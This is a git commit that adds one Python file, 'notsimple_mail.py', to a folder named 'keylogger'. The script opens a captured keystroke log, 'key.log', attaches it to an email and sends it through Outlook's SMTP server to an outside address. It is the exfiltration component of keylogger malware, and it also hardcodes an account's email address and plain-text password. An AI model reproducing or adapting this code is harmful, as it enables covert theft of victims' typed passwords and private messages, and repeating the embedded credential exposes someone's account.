2c4acddcfd14537667801a1b145f0ead3bf4a36f
Rafaela dos Santos <89286734+RafaelaDOT@users.noreply.github.com>
2022-12-14 14:40:44 -0300

    Add files via upload

---
+++ keylogger/notsimple_mail.py
@@ -0,0 +1,43 @@
+import smtplib
+
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+
+try:
+    fromaddr = "leticiademarcco@live.com"
+    toaddr = 'botjava@outlook.pt'
+    msg = MIMEMultipart()
+
+    msg['From'] = fromaddr 
+    msg['To'] = toaddr
+    msg['Subject'] = "Teste"
+
+    body = "\nCorpo da mensagem"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = 'key.log'
+
+    attachment = open('key.log','rb')
+
+
+    part = MIMEBase('application', 'octet-stream')
+    part.set_payload((attachment).read())
+    encoders.encode_base64(part)
+    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+    msg.attach(part)
+
+    attachment.close()
+
+    server = smtplib.SMTP('smtp.outlook.com', 587)
+    server.starttls()
+    server.login(fromaddr, "Lele4321")
+    text = msg.as_string()
+    server.sendmail(fromaddr, toaddr, text)
+    server.quit()
+    print('\nEmail enviado com sucesso!')
+except:
+    print("\nErro ao enviar email")
